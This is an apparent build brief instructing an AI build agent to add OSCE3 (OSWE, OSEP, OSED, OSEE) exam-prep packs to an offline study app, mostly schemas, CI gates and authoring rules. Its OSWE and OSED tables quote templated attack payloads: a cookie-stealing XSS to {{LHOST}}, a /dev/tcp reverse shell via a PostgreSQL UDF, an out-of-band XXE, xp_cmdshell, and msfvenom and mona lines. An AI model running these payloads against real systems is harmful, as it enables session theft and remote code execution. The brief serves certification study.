---
title: CODE-PROMPT-v3-osce3-packs
purpose: Additive content-pack brief — ADD the oswe / osep / osed / osee packs to the already-running Cephalo build
target-repo: /home/vlad/bigOscpPrep
applies-to: the same self-driving build agent that runs _prompts/LOOP.md
binds-to: CODE-PROMPT.md (FROZEN contract) + CODE-PROMPT-v2-arsenal.md (the v2 surfaces it makes pack-aware)
source-of-truth: _prompts/OSCE3-SOURCE-INDEX.md (Joas Antonio's taxonomy + ~250 links; NO commands/payloads)
companion: the "Ringzero" exploit-dev project owns DEEP OSED/OSEE hands-on — LINK OUT, never duplicate here
prerequisite: the v2 arsenal surfaces (Ask/CVE/Advisor/Nmap/Decision/ToolBinary) must be BUILT by the v2 loop before §7 can wire them; today only RealmSwitcher exists in src/
version: v3
---

# CODE-PROMPT-v3 — THE OSCE3 CONTENT PACKS (OSWE · OSEP · OSED · OSEE)

You are the Cephalo build agent. Cephalo already exists and builds in `/home/vlad/bigOscpPrep`
(Vite + React 18 SPA, TS strict, Zustand, prebuilt+serialized MiniSearch, `@xyflow/react` mindmaps,
`vite-plugin-pwa` offline, Rive octopus). A self-driving loop (`_prompts/LOOP.md`) already iterates the
OSCP content (v1) and is building the v2 "arsenal" surfaces (Ask / CVE / Advisor / Nmap / Decision /
ToolBinary) toward a zero-gaps MASTER CHECKLIST. **This brief is purely ADDITIVE CONTENT.** It adds four
new content packs — `oswe`, `osep`, `osed`, `osee` — as NEW content directories, NEW datasets, NEW
references, an EXTENSION of the existing pack store, one (optional) pack-switcher component, a handful of
NEW `--cph-` KEYS, NEW CI gates, a small NON-frozen generalization of two build/gate scripts, and NEW LOOP
checklist blocks. **It changes ZERO frozen files. It re-implements ZERO existing capability — it populates
and filters the surfaces the prior loops build.**

Read this whole brief before writing a line. Then drive every new `☐` to `☑` exactly as the existing loop
does: a leaf is `☑` only when it is content-complete **and** its CI gate is green.

> **ORDERING (LOOP v1 → v2 → v3).** v1 (OSCP content) and v2 (the arsenal surfaces) come FIRST. §7
> ("make the EXISTING surfaces pack-aware") is a HARD PREREQUISITE on v2: as of today `grep` finds only
> `src/components/RealmSwitcher.tsx`; Ask (F4) / CVE (F6) / Advisor (F3) / Nmap (F8) / Decision (F5/F7) /
> ToolBinary (F2) are SPECIFIED in `CODE-PROMPT-v2-arsenal.md` and do not yet exist in `src/`. This brief
> does NOT treat them as live. §7 is gated behind their v2 completion; until a surface exists, its SURF-*
> box stays `☐` and the brief only stipulates the filter contract it must satisfy when built.

---

## 0. DISCIPLINE — READ FIRST, LOUD, NON-NEGOTIABLE, BAKED INTO EVERYTHING

These are exam-prep ethics + copyright + safety requirements, not preferences. They are restated on-page
(banner + per-pack chips) AND enforced in CI. Author honestly or do not author.

### 0.1 TRANSFORM, NEVER REPRODUCE — mirror short headings, summarize, LINK; never copy
- You may mirror the **short, functional topic headings** from the OSCE3 taxonomy (`_prompts/OSCE3-SOURCE-INDEX.md`).
  You may NOT copy long-form blog/course prose, walkthrough narratives, or any verbatim text.
- **OffSec course material is copyrighted** (AWAE / WEB-300, PEN-300, EXP-301, EXP-401/OSEE). Never paste,
  paraphrase-at-length, or reconstruct course PDFs / Drive files / lab guides. Cephalo authors **original
  one-line summaries + canonical tool syntax**, then LINKS OUT via `Reference`.
- Every OSCE3 Technique/Command cites **Joas's guide** (`ref.osce3.joas`) AND ≥1 **primary author/repo**
  source from §6. `osce3-cite` (G-OSCE3-1) gate fails any OSCE3 node missing that citation pair.

### 0.2 NO MACHINE NAMES — anywhere, ever
- Several linked OSCE3 resources are HTB/PG "exam reviews/notes." NEVER import a machine name, a per-machine
  solution, an IP, a flag value, or a box-specific chain. Techniques only. The existing `gate-denylist`
  (hash-only machine-name denylist) + `no-machine-names` invariant apply — now spanning all packs via the
  generalized `loadBundle()` (§9.0).
- NEVER commit the source PDF / `.xlsx` / `.xmind` / Trophy-Room list. Link-only; the source repo ships no
  LICENSE, so re-hosting is prohibited.

### 0.3 ANTI-FABRICATION — never invent; `[UNVERIFIED]` + cite
- Never invent a CVE / EDB-id / flag / offset / gadget / version / function / CLSID / build-threshold. If a
  fact is not certain ⇒ literal `[UNVERIFIED]` in prose + non-empty `references[]` + a human reason. This
  reuses the EXISTING `gate-fabrication` and `gate-unverified-refs` gates (a node with
  `confidence:'unverified'` MUST carry references) — now spanning all packs via §9.0.
- Defang-by-default placeholders only: `<tun0-ip>`, RFC5737 `198.51.100.0/24` & `192.0.2.0/24`, RFC3849
  `2001:db8::/32`, `example.local` / `example.lab`. Sensitive vars (`PASS`,`NTHASH`,`AESKEY`,`DBPASS`) are
  masked + session-only, never persisted. Existing `gate-routable-ip` + `gate-placeholder` apply (§9.0).

### 0.4 NO BUNDLED BINARY — link official sources only; evasion is METHODOLOGY-ONLY
- Tool binaries / `.ps1` / `.exe` / `.bin` are NEVER hosted, bundled, or committed. Every tool is linked via
  the frozen `Reference` type (release PAGE, never a guessed pinned asset URL) and surfaced through the v2
  `ToolBinary` arsenal (F2, once built) with its literal `fetchNote`. Reuses the EXISTING no-bundled-binary
  discipline (no `binaryUrl`, no committed blob).
- **EVASION (AV / EDR / AMSI / AppLocker / network-filter) is CONCEPT/METHODOLOGY ONLY.** Cephalo ships the
  *theory*, the *detection/enumeration* commands, the *tool provenance*, and the *decision flow* — it does
  NOT ship a working bypass payload, a copy-paste AMSI-patch string, a shellcode loader, an obfuscated
  stager, or a signature-evading artifact. The NEW `evasion-methodology-only` gate (G-OSCE3-3) enforces this.

### 0.5 SCOPE SPLIT — deep packs vs reference packs; deep exploit-dev → Ringzero
- **`oswe` + `osep` = DEEP copy-paste COMMAND packs** (web payloads/methodology; evasion methodology + AD/
  lateral/MSSQL/post-ex). Where OSEP AD/lateral overlaps the EXISTING OSCP `ad.*` content, **REUSE via
  `tags`/`relatedIds` + cross-link — do NOT duplicate** a single command. OSEP techniques point at the
  existing `ad.lateral.*`, `ad.cred.*`, `ad.dom.*` nodes.
- **`osed` + `osee` = TECHNIQUE/REFERENCE packs** (topics + the genuinely copy-pasteable helpers: `msfvenom`,
  `mona.py`, WinDbg, `nasm`/`nasm_shell`, `pattern_create`/`pattern_offset`, ROP helpers) + links. The DEEP
  hands-on exploit-dev (full debugger walk-throughs, bespoke ROP chains, kernel-driver RE) lives in the
  companion **Ringzero** project → LINK OUT (`ref.ringzero`), do NOT reproduce it here.

### 0.6 DETERMINISTIC · OFFLINE · NO AI · EXAM-LEGAL · FROZEN
- No LLM, no inference, no ML lib, no runtime network, no telemetry, no signup. Pure deterministic retrieval
  over authored content + the prebuilt serialized MiniSearch index. No `Math.random`, no ambient clock in
  app/runtime logic. (Reuses all v2 invariants 0.1–0.5.)
- **DETERMINISM SCOPE — say it precisely.** The load-bearing byte-identical guarantee is scoped to the **five
  frozen type files** only: `src/types/{content,engine,components,tokens}.ts` + `src/types/schema-parity.test.ts`
  stay BYTE-IDENTICAL every tick (`git diff --stat` on those five paths = empty). The emitted content JSON is
  **NOT** byte-stable: `scripts/build-content.ts` stamps `generatedAt: new Date().toISOString()` (line ~289,
  ambient clock), so `public/content/*.json` differs across builds by that timestamp. The correct check for
  "OSCP output unchanged" is therefore **"structurally unchanged ignoring `generatedAt`"** (diff after
  normalizing/stripping the `generatedAt` field), never a raw byte diff of the JSON. Do not claim
  `oscp.json` is byte-stable anywhere.
- **NEVER edit a frozen module.** The five frozen files above are off-limits. Everything this brief needs is
  CONTENT + NON-frozen sibling modules + NON-frozen build/gate scripts.

---

## 1. HARD RULES (violating any is a build failure)

1. **NEVER edit a frozen module.** No new field/enum/union member on any frozen interface. The four packs are
   pure CONTENT + non-frozen sibling modules that IMPORT frozen types.
2. **`osed` / `osee` ride the `(string & {})` arm of `PackId`.** Live contract: `PackId = 'oscp' | 'oswe' | 'osep' | (string & {})`
   (`src/types/content.ts:6`). The string literals `'osed'` and `'osee'` are valid `PackId` values **with ZERO
   change to the frozen union**, and `PackIdSchema = z.string().min(1)` (`src/data/schema.ts:8`) already
   accepts them with **ZERO schema-parity-test change**. Put them in `packs: [...]` arrays exactly like
   `'oswe'`/`'osep'`. Do not "widen" the union — it is already wide enough by construction.
3. **Every content entity carries `packs: PackId[]`** (Section, Technique, Command, MindMap). An OSCE3 entity's
   `packs` contains its pack id (e.g. `[oswe]`); a cross-pack shared node may list several. An OSEP node that
   reuses an OSCP AD command lists `[osep]` on its OWN technique and uses `relatedIds`→ the `oscp` node; it
   does NOT relabel the OSCP command. `gate-pack-coverage` (G-OSCE3-2) audits this.
4. **Reuse the ONE enum, always.** `OS = 'linux'|'windows'|'ad'` (never `'web'`, never `'activedirectory'`;
   web content is `os:['linux']` or `['windows']` by host). `Severity`/`Confidence`/`Shell`/`CredMode`/`Phase`/
   `OctoState` are reused unchanged. `Shell` already has `'sql'`, `'powershell'`, `'cmd'`, `'text'` — OSWE SQL
   payloads are `shell:'sql'`; OSED/OSEE WinDbg/nasm snippets are `shell:'text'` or `shell:'cmd'`.
5. **Content NEVER string-builds a command.** Every runnable line is a frozen `Command.template` with
   `{{UPPER_SNAKE}}` tokens rendered by the frozen `TemplateEngine`. No JS concatenation, no interpolation in
   prose. `build-content`'s `checkVars` fails the build on any unknown token.
6. **Never invent.** No fabricated CVE/EDB/flag/offset/gadget/version/function. Uncertain ⇒ `[UNVERIFIED]` +
   `references[]` + reason. ESC numbers, exploit ids, sudo CVEs, mitigation names are all cited or flagged.
7. **Never host/bundle/commit a binary.** Link the official release PAGE via `Reference`; surface via the v2
   `ToolBinary` arsenal (once built). No `binaryUrl`. No committed blob.
8. **Evasion content is methodology/concept only** (rule 0.4). No working bypass payload ships, full stop.
9. **New `--cph-` KEYS only** (pack badges) in `src/types/tokens.v3.ts` — a NEW non-frozen file; the frozen
   `src/types/tokens.ts` is untouched. Code declares KEYS, design supplies VALUES. Meaning never hue-only
   (pair color + icon + text label).
10. **The frozen `ContentBundle` shape is NOT changed.** The build emits ONE `ContentBundle`-shaped JSON
    artifact PER PACK (`public/content/<packId>.json`) plus a combined, `packs[]`-tagged search index. Lazy-load
    enabled pack bundles at runtime. The CI gates read a MERGED in-memory bundle across all packs (§9.0).

---

## 2. FROZEN CONTRACT YOU BIND TO (do not modify; restated for binding)

```
OS = 'linux' | 'windows' | 'ad'                 (theme attr data-os; never 'activedirectory', never 'web')
PackId = 'oscp' | 'oswe' | 'osep' | (string & {})   ('osed'/'osee' = valid via the (string & {}) arm)
Phase enum (recon … cleanup); Confidence = 'verified' | 'unverified'
Severity = 'info' | 'low' | 'medium' | 'high' | 'critical'
Shell = 'bash' | 'powershell' | 'cmd' | 'sql' | 'text'
CredMode = 'password' | 'nthash' | 'kerberos'   (variant-selection on ONE template, not three copies)
ArchetypeBand = 'core'|'high'|'medium'|'low'; VarGroup = 'network'|'target'|'auth'|'ad'|'web'|'files'|'misc'
OctoState = 'idle'|'greeting'|'listening'|'thinking'|'found'|'empty'|'copied'|'error'|'celebrate'
```
Frozen content interfaces (import, never edit): `VariableDef`, `VariableValidation`, `CommandVariant`,
`Command`, `Technique`, `Section`, `Tag`, `MindMap{Node,Edge}`, `BloodHoundQuery`, `Reference`, `Pack`,
`ContentBundle`. Frozen engine: `TemplateEngine` (renders `{{UPPER_SNAKE}}` + `quote|upper|lower|urlencode|b64`
filters + `{{TOKEN:fallback}}`), `SearchDoc`/`SearchFilters` (**already carry `packs: PackId[]` at
`engine.ts:73/79`**), `MindMapRenderModel`. Frozen components: `CommandCardProps`, `SearchPaletteProps`
(**`filters?: SearchFilters` already supports a `packs` facet**), `MindMapProps`, `OctopusMascotProps`.

> KEY OBSERVATION: the frozen surface was already built pack-aware. `SearchDoc.packs`, `SearchFilters.packs`,
> and `packs[]` on every entity already exist. This brief **populates** them and **filters by** them. It does
> not extend the contract to do so.

---

## 3. ADDITIVE PACK CONTRACT (embed verbatim — this is the law for §4–§10)

```
ADDITIVE PACK CONTRACT — Cephalo OSCE3 packs
1.  A "pack" is a cert area: oscp (exists) + oswe, osep, osed, osee (this brief). Nothing else.
2.  PackId stays frozen as 'oscp'|'oswe'|'osep'|(string & {}). osed/osee are string values on the
    (string & {}) arm. ZERO union edit. ZERO schema-parity-test change (PackIdSchema = z.string().min(1)).
3.  Every Section/Technique/Command/MindMap carries packs: PackId[] >= 1. A node belongs to exactly the
    packs whose syllabus it serves. Shared OSCP<->OSEP nodes are cross-linked via relatedIds, NEVER cloned.
4.  Each pack ships its content under content/<packId>/**.yaml and a per-pack manifest
    src/data/pack-manifests/<packId>.ts (label, blurb, default-OS skin, technique-id roots, primary refs).
    The pack registry src/data/packs.ts (NON-frozen) registers all five Pack records.
5.  The build emits one ContentBundle JSON per pack (public/content/<packId>.json) + ONE combined
    search index whose every SearchDoc.packs is set. The app lazy-loads a pack bundle only when enabled.
    The bloodhound/tag SearchDocs stay packs:['oscp'] (OSCE3 ships no bloodhound).
6.  Activation is UI state in the EXISTING non-frozen store src/stores/packs.ts (usePacks): array
    `enabled: PackId[]`, persisted as 'cephalo.packs', oscp locked-on. This brief EXTENDS it with a
    `focused` pack (skin/badge) + a lazy same-origin bundle loader. NO new parallel store, NO src/state/.
7.  Search, mindmaps, and EVERY v2 surface (Ask/CVE/Advisor/Nmap/Decision) FILTER by usePacks.enabled.
    They are made pack-aware by passing the active SearchFilters.packs / a pack predicate — NOT re-implemented,
    and only AFTER the v2 loop has built them.
8.  oswe+osep = deep copy-paste command packs. osed+osee = technique/reference packs (+ msfvenom/mona/WinDbg/
    nasm/pattern/ROP helpers); deep hands-on => link Ringzero (ref.ringzero), never duplicated.
9.  Discipline (§0) is enforced by CI on every pack via a MERGED-bundle gate loader (loadBundle spans all
    registered packs): transform-not-reproduce+cite (osce3-cite), pack-coverage, evasion-methodology-only,
    plus the reused anti-fab / no-bundled-binary / no-machine-names / routable-ip / placeholder /
    unverified-refs / overlap / side-table / credmode / coverage gates. No frozen edit. Deterministic,
    offline, no AI.
```

---

## 4. PACK REGISTRATION — without editing a frozen module

### 4.1 The pack registry (`src/data/packs.ts`, NON-frozen — extend in place)
Register all five `Pack` records. `osed`/`osee` are added as ordinary string-id records (the `(string & {})`
arm makes this type-legal with no union edit). `oswe`/`osep`/`osed`/`osee` keep `enabledByDefault: false`;
bump `version` from `'0'` to `'1'` as each fills.

```ts
export const PACKS: Pack[] = [
  { id: 'oscp', label: 'OSCP / PEN-200',  description: '…existing…', enabledByDefault: true,  os: ['linux','windows','ad'], version: '1' },
  { id: 'oswe', label: 'OSWE / WEB-300',  description: 'White-box web exploitation: source-review → auth bypass → RCE. Deep copy-paste pack.', enabledByDefault: false, os: ['linux'],          version: '1' },
  { id: 'osep', label: 'OSEP / PEN-300',  description: 'Evasion methodology + lateral movement, MSSQL, AD. Reuses OSCP AD via cross-links.',   enabledByDefault: false, os: ['windows','ad'],   version: '1' },
  { id: 'osed', label: 'OSED / EXP-301',  description: 'Windows user-mode exploit-dev reference: WinDbg, SEH, egghunters, ROP, DEP/ASLR. Hands-on → Ringzero.', enabledByDefault: false, os: ['windows'], version: '1' },
  { id: 'osee', label: 'OSEE / EXP-401',  description: 'Advanced Windows exploitation reference: mitigation bypass, heap, kernel-driver RE. Hands-on → Ringzero.', enabledByDefault: false, os: ['windows'], version: '1' },
];
```

### 4.2 Per-pack manifest (`src/data/pack-manifests/<packId>.ts`, NEW non-frozen)
A small typed descriptor consumed by the pack switcher + the coverage gate. NOT a frozen type — a local
interface that references frozen `PackId`/`Id`/`RefId`.

```ts
export interface PackManifest {
  id: PackId;                 // 'oswe' | 'osep' | 'osed' | 'osee'
  label: string;              // 'OSWE / WEB-300'
  blurb: string;              // one line; transform-not-reproduce
  defaultOsSkin: OS;          // which --cph-* skin the realm wears when focused
  techniqueRoots: string[];   // dotted-id prefixes: ['oswe.']
  kind: 'command-pack' | 'reference-pack';   // oswe/osep vs osed/osee
  primaryRefs: RefId[];       // the author/repo refs this pack is built on (§6)
  ringzeroLink?: RefId;       // osed/osee only -> ref.ringzero
  badgeTokenKey: string;      // --cph-pack-<id> (design owns the value)
}
```

### 4.3 Build generalization (`scripts/build-content.ts`, NON-frozen — generalize, don't fork)
Today `CONTENT_DIR = content/oscp` and it emits `public/content/oscp.json`. Generalize:
- Iterate `PACKS.map(p => p.id)`; for each, load `content/<packId>/**.yaml`, Zod-validate against the EXISTING
  `src/data/schema.ts`, assemble a `ContentBundle`, and emit `public/content/<packId>.json`. The OSCP path
  is unchanged in shape — it is just one iteration of the loop. (Its JSON still carries the ambient
  `generatedAt` stamp; do NOT assert byte-stability on it — see §0.6.)
- Build ONE combined MiniSearch index across ALL packs' docs, setting `SearchDoc.packs` from each entity's
  `packs[]`. Emit `public/content/search-index.json` + `search-side.json` (verified>unverified tiebreak) as
  today, now spanning every pack. Mindmaps emit per pack into `public/content/mindmaps.json` keyed by pack.
- **PRESERVE the oscp-scoped SearchDocs.** `build-content.ts` hardcodes `packs:['oscp']` on the bloodhound
  SearchDocs (line ~390) and tag SearchDocs (line ~409). The combined-index generalization MUST keep these
  `oscp`-scoped — OSCE3 ships NO bloodhound and reuses OSCP AD via `relatedIds`, so do not relabel or
  broaden them. Only entity-derived docs (sections/techniques/commands) take their `packs` from the entity.
- Fail the build if a `content/<dir>/` exists with no matching registered `Pack` (and vice-versa).

### 4.4 Runtime activation — EXTEND the EXISTING store (`src/stores/packs.ts`, NON-frozen)
**Do NOT invent `src/state/pack-store.ts`. The repo already ships `src/stores/packs.ts` (`usePacks`) and the
content/search stores already read its `enabled` array.** A parallel `Set`-based store would duplicate
activation state and desync the already-wired filtering. Extend the existing store in place:

- KEEP exactly as-is: `enabled: PackId[]` (seeded `['oscp']`), `toggle(id)`, `isEnabled(id)`, persistence
  under `name: 'cephalo.packs'`, and the **oscp-locked-on** invariant (oscp can never be toggled off).
- ADD: `focused: PackId` (default `'oscp'`) + `focus(id: PackId)` for skin/badge selection (persist it
  alongside the toggle set — non-sensitive settings only, same rules as theme). ADD a lazy bundle loader
  `loadPack(id)` invoked on enable.
- On enable, lazy-`fetch('/content/<id>.json')` (same-origin, precached by `vite-plugin-pwa`), validate,
  and merge into the content store. Disabling unmounts the content from view but keeps it cached. No remount,
  no network beyond the same-origin precache, no content mutation.

```ts
// src/stores/packs.ts — EXTENDED (array enabled + 'cephalo.packs' persistence + oscp-lock all preserved)
interface PacksState {
  enabled: PackId[];                 // unchanged: array, seeded ['oscp']
  focused: PackId;                   // NEW: drives the realm skin/badge when a pack is in focus
  toggle: (id: PackId) => void;      // unchanged (oscp stays locked on); on enable -> loadPack(id)
  isEnabled: (id: PackId) => boolean;// unchanged
  focus: (id: PackId) => void;       // NEW
  loadPack: (id: PackId) => Promise<void>; // NEW: same-origin lazy fetch+validate+merge
}
// persist({ name: 'cephalo.packs' }) — now also persists `focused` (settings only).
```

---

## 5. CONTENT — per-cert Technique trees + AUTHORED Commands

Author under `content/<packId>/**.yaml` using the EXISTING authoring conventions (see `content/oscp/ad/adcs.yaml`):
`sections:` → `techniques:` → `commands:`. Every command: canonical real tool syntax in `template` with
`{{TOKENS}}`, correct `shell`, `confidence`, `references[]` (incl. `ref.osce3.joas` + ≥1 primary), `danger`,
`tags`, `packs`. Variables reuse the existing registry where possible and add the new OSCE3 tokens in §5.5.

Dotted-id namespaces (mirror the taxonomy; short functional headings only): `oswe.*`, `osep.*`, `osed.*`, `osee.*`.

### 5.1 OSWE pack — `content/oswe/**` (22 Techniques, DEEP command pack)
Suggested files: `method.yaml`, `xss.yaml`, `sqli.yaml`, `deser.yaml`, `rce.yaml`, `upload.yaml`, `php.yaml`,
`pgsql.yaml`, `bypass.yaml`, `ssti-xxe.yaml`, `tokens-exfil.yaml`, `cmdinj.yaml`, `mindmaps.yaml`.

| id | heading | example AUTHORED command (template + shell) |
|---|---|---|
| `oswe.method.tooling` | web tooling & methodology | `nuclei -u {{URL}} -severity high,critical` · Burp/ZAP proxy setup (prose) ; `shell:'bash'` |
| `oswe.method.sourcereview` | source-code analysis (white-box) | `grep -rniE "(eval|exec|deserialize|pickle|unserialize|Runtime\.exec)" {{SOURCE_DIR}}` ; sink→source methodology body |
| `oswe.xss.stored` | persistent XSS → account takeover | payload Command `<script>fetch('http://{{LHOST}}/c?'+document.cookie)</script>` `shell:'text'`, danger:high |
| `oswe.session.hijack` | session hijacking | cookie-replay + CSRF-token theft methodology; `curl -b 'session={{SESSION}}' {{URL}}` |
| `oswe.deser.dotnet` | .NET deserialization | `ysoserial.exe -g TypeConfuseDelegate -f Json.Net -c "{{CMD}}" -o base64` `shell:'cmd'` (cite ref.ysoserialnet) |
| `oswe.rce.chain` | RCE (chained auth-bypass→exec) | methodology Technique linking the auth-bypass + sink nodes; commands cross-ref |
| `oswe.sqli.blind` | blind SQL injection | `sqlmap -u "{{URL}}" --data="{{POST_DATA}}" --technique=B --batch --dump` `shell:'bash'` ; manual boolean payload variant `shell:'sql'` |
| `oswe.exfil.data` | data exfiltration | OOB DNS/HTTP exfil methodology; `shell:'sql'` payload tokens for `{{COLLAB}}` |
| `oswe.upload.bypass` | file-upload + extension-filter bypass | double-extension / magic-byte / `.phar` / null-byte methodology; `curl -F 'file=@shell.php;type=image/png' {{URL}}` |
| `oswe.php.typejuggle` | PHP type juggling | loose-comparison `0e…` payload table (cite); `shell:'text'` |
| `oswe.pgsql.udf` | PostgreSQL extensions & UDFs | `CREATE FUNCTION sys_exec(text) RETURNS int AS '{{SO_PATH}}','sys_exec' LANGUAGE c;` `shell:'sql'`, danger:critical |
| `oswe.bypass.regex` | REGEX-restriction bypass | newline/`\n`-anchored bypass methodology + payloads `shell:'text'` |
| `oswe.php.magichash` | magic hashes | `0e`-prefixed magic-hash reference table (cite) `shell:'text'` |
| `oswe.bypass.charset` | character-restriction bypass | quote-less / hex / `CHAR()` encodings `shell:'sql'` |
| `oswe.pgsql.udfrevshell` | UDF reverse shells | `SELECT sys_exec('bash -c "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"');` `shell:'sql'`, danger:critical |
| `oswe.pgsql.largeobject` | PostgreSQL large objects | `SELECT lo_import('{{REMOTE_FILE}}', {{OID}}); … lo_export(…)` `shell:'sql'` |
| `oswe.xss.dom` | DOM XSS (black box) | source→sink methodology; `location.hash`/`postMessage` sink map `shell:'text'` |
| `oswe.ssti` | SSTI | engine-detection probe `{{7*7}}` → engine-specific RCE payload table (Jinja2/Twig/FreeMarker), cite |
| `oswe.token.weakrandom` | weak random token generation | predictable-token methodology (mt_rand/time-seed) + cite |
| `oswe.xxe` | XXE | OOB XXE payload `<!DOCTYPE r [<!ENTITY % x SYSTEM "http://{{LHOST}}/x.dtd">%x;]>` `shell:'text'` |
| `oswe.rce.dbfunc` | RCE via database functions | `xp_cmdshell` / `COPY … PROGRAM` / `INTO OUTFILE` methodology `shell:'sql'`, danger:critical |
| `oswe.cmdinj.websocket` | OS command injection via WebSockets | `wscat -c ws://{{RHOST}}:{{RPORT}}/ws` then injected-param methodology |

Each Technique: `os:['linux']` (or `['windows']` for .NET), `phase:'web'|'exploitation'`, `confidence`
(`unverified`+cite for any version/CVE/engine claim), `references:[ref.osce3.joas, ref.oswe.timip, …]`,
`packs:[oswe]`. Author 2–6 commands per technique. Web payloads ARE shippable (methodology, copy-paste);
keep them defanged (`{{LHOST}}`, `example.local`).

> NOTE: the OSWE XSS/SQLi/UDF/deserialization payloads are **in-scope deep-pack content**, not evasion. The
> `evasion-methodology-only` gate (G-OSCE3-3) is scoped by the `evasion` tag and does NOT touch OSWE nodes.

### 5.2 OSEP pack — `content/osep/**` (16 Techniques, DEEP pack; AD REUSES OSCP)
Suggested files: `theory.yaml`, `clientside.yaml`, `injection.yaml`, `evasion.yaml`, `whitelisting.yaml`,
`netfilter.yaml`, `linux-post.yaml`, `kiosk.yaml`, `win-creds.yaml`, `lateral.yaml`, `mssql.yaml`,
`ad-bridge.yaml`, `combine.yaml`, `mindmaps.yaml`.

**EVASION nodes are METHODOLOGY-ONLY** (rule 0.4) — they ship theory + detection/enum + tool provenance +
decision flow, NEVER a working bypass payload. Tag every evasion node `evasion` so `evasion-methodology-only`
(G-OSCE3-3) scopes it.

| id | heading | content discipline |
|---|---|---|
| `osep.theory.os` | OS & programming theory | concept Technique (PE/loader/Win32 API basics), body prose, no command |
| `osep.clientside.office` | client-side exec (Office) | METHODOLOGY: macro-vector concept + delivery decision-flow; NO weaponized macro string |
| `osep.clientside.jscript` | client-side exec (JScript) | METHODOLOGY: `.js`/`.hta`/`wscript` vector concept; NO working stager |
| `osep.inject.process` | process injection & migration | METHODOLOGY: CreateRemoteThread/APC/migration THEORY; tool provenance only; NO loader code |
| `osep.evasion.intro` | intro AV evasion | METHODOLOGY: signature vs heuristic vs behavioral; how to TEST (DefenderCheck/ThreatCheck — link) |
| `osep.evasion.advanced` | advanced AV evasion | METHODOLOGY: unhooking/syscalls/sleep-obfuscation CONCEPT; cite; NO payload |
| `osep.evasion.applocker` | application-whitelisting bypass | METHODOLOGY + LOLBAS cross-ref (`win.lolbas`); enumerate policy `Get-AppLockerPolicy -Effective` `shell:'powershell'` (enumeration is fine) |
| `osep.evasion.netfilter` | bypassing network filters | METHODOLOGY: DNS/HTTPS/domain-fronting CONCEPT; tunneling tool provenance (chisel/ligolo cross-ref) |
| `osep.linux.post` | Linux post-exploitation | REUSE `linux.post.*`, `linux.privesc.*` via `relatedIds`; add OSEP-specific enum commands only if non-dup |
| `osep.kiosk.breakout` | kiosk breakouts | METHODOLOGY: dialog/shortcut/URI escape concept; no machine specifics |
| `osep.win.creds` | Windows credentials | REUSE `win.loot.*` + `ad.lateral.credtheft`; `relatedIds`; mimikatz = concept/provenance only |
| `osep.win.lateral` | Windows lateral movement | REUSE `ad.lateral.psexec/wmiexec/evil-winrm/ptt/opth`; cross-link, do NOT clone |
| `osep.linux.lateral` | Linux lateral movement | SSH key/agent-hijack/pivot methodology; reuse `xcut.pivot.*` |
| `osep.mssql.attacks` | Microsoft SQL attacks | AUTHOR real commands: `mssqlclient.py {{DOMAIN}}/{{USER}}:{{PASS}}@{{RHOST}}` ; `EXEC xp_cmdshell '{{CMD}}'` `shell:'sql'`, danger:critical ; linked-server `EXECUTE … AT [{{LINKED}}]` ; impersonation `EXECUTE AS LOGIN` |
| `osep.ad.exploit` | Active Directory exploitation | BRIDGE Technique: `relatedIds` → the whole OSCP `ad.*` tree (Kerberoast/ADCS/delegation/ACL/DCSync). NO duplication; OSEP lens = chaining + evasion notes |
| `osep.method.combine` | combining the pieces | methodology Technique: full-chain mindmap (client-side→evasion→creds→lateral→AD→DA) |

OSEP `os`: `['windows']` / `['ad']` / `['linux']` per node. `phase` appropriate. The MSSQL + post-ex + kiosk
nodes carry real copy-paste commands; the evasion + client-side + injection nodes carry methodology +
provenance. The reused `gate-overlap` (8-gram) — now scanning the MERGED bundle (§9.0) — mechanically catches
any OSEP node that clones an OSCP `ad.*` command instead of cross-linking it.

### 5.3 OSED pack — `content/osed/**` (10 Techniques, REFERENCE pack)
Suggested files: `windbg.yaml`, `stack.yaml`, `seh.yaml`, `ida.yaml`, `egghunter.yaml`, `shellcode.yaml`,
`re.yaml`, `dep-aslr.yaml`, `formatstring.yaml`, `rop.yaml`, `mindmaps.yaml`. Ship the genuinely
copy-pasteable helpers; point hands-on at Ringzero.

| id | heading | copy-paste helper commands (authored) |
|---|---|---|
| `osed.windbg` | WinDbg workflow | `!load narly` · `!exchain` · `!py mona findmsp` (concept body) ; `shell:'text'` cheat-lines |
| `osed.stack.bof` | stack buffer overflows | `msf-pattern_create -l {{LENGTH}}` · `msf-pattern_offset -l {{LENGTH}} -q {{EIP}}` · `!mona pattern_create {{LENGTH}}` `shell:'cmd'` |
| `osed.seh` | SEH overflows | `!mona seh -m {{MODULE}}` · `!mona find -s "\xff\xe1"` (pop/pop/ret hunt) `shell:'cmd'` |
| `osed.ida` | intro IDA Pro | navigation/xref methodology body; no command |
| `osed.egghunter` | egghunters | `msfvenom -p windows/exec CMD={{CMD}} -e x86/shikata_ga_nai EXITFUNC=thread` + egg tag concept ; `!mona egg -t w00t` `shell:'cmd'` |
| `osed.shellcode` | shellcode from scratch | `nasm_shell.rb` → `nasm > <instr>` · `nasm -f bin egg.asm -o egg.bin` `shell:'bash'` |
| `osed.re.bugs` | reverse-engineering bugs | crash-triage methodology; `!analyze -v` `shell:'text'` |
| `osed.bypass.depaslr` | stack overflow + DEP/ASLR bypass | `!mona ropfunc -m {{MODULE}}` · ROP-chain concept; DEEP build → ref.ringzero `shell:'cmd'` |
| `osed.formatstring` | format-string attacks | `%n`/`%x` write-primitive methodology; cite |
| `osed.rop` | custom ROP chains | `!mona rop -m {{MODULES}} -cpb '{{BADCHARS}}'` · `!mona jmp -r esp -m {{MODULE}}` `shell:'cmd'` ; deep chain → Ringzero |

Every OSED node: `os:['windows']`, `phase:'exploitation'`, `confidence:'unverified'`+cite for any
offset/gadget/version claim (never invent an offset), `references:[ref.osce3.joas, ref.osed.epi052,
ref.corelan, ref.ringzero]`, `packs:[osed]`. Body says "deep hands-on → Ringzero."

### 5.4 OSEE pack — `content/osee/**` (5 Techniques, REFERENCE pack; mostly → Ringzero/links)
Suggested file: `osee.yaml`, `mindmaps.yaml`.

| id | heading | content |
|---|---|---|
| `osee.usermode.mitigations` | user-mode mitigation bypass (DEP/ASLR/CFG/ACG/CET) | concept map of each mitigation + the class of bypass (CONCEPT); cite NCC `windows_mitigations`; `[UNVERIFIED]` on any version-specific claim |
| `osee.heap.escape` | advanced heap + guest-to-host / sandbox escape | heap-grooming + escape THEORY; link disclosures (review disclosure status before linking; `[UNVERIFIED]`) |
| `osee.wdeg.disarm` | disarming WDEG + version-independent weaponization | CONCEPT only; cite; NO payload |
